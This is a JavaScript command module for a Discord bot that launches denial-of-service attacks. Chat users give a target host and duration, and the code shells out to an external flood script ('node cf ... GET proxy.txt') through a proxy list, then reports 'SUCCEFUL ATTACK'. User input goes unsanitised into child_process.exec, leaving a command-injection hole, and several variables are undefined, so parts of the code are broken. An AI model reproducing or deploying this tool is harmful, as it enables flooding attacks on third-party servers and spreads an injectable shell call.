const Discord = require("discord.js");
const ms = require("ms");
const ping = require("ping");
const libquery = require("libquery");
function Warn(msg) {
  var embed = new discord.RichEmbed().setTitle(msg).setColor("#CF9B10");
  return embed;
}

function isLetter(c) {
  return c.toLowerCase() != c.toUpperCase();
}

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const reqip = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

//BLACKLISTING SYSTEM 
 if (args[1] === "IP") {
  msg.channel.send(Warn("TARGET IS BLACKLISTED!"));
  return;
}
  if (isLetter(port)) {
    msg.channel.send(Warn("time cannot contain characters!"));
    return;
  }
  if (isLetter(port)) {
    msg.channel.send(Warn("Time cannot contain characters!"));
    return;
  }
  if (Number(port) > ayarlar.maxtime) {
    msg.channel.send(Warn("Max time is " + ayarlar.maxtime + " seconds!"));
    return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;cap target time reqip`")
	.setFooter("Please do not attack government server!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node cf ${host} ${port} 300 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ZER0 BOT** 🚀')
	.setTimestamp()
  .setDescription("`SUCCEFUL ATTACK`")
	.setFooter('© Developer: YUKAI', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ZER0 BOT** 🚀')
	.setTimestamp()
	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['cap'],
  permLevel: 0
}

exports.help = {
  name: 'cap',
  description: 'zxcr9999',
  usage: 'cap'
}
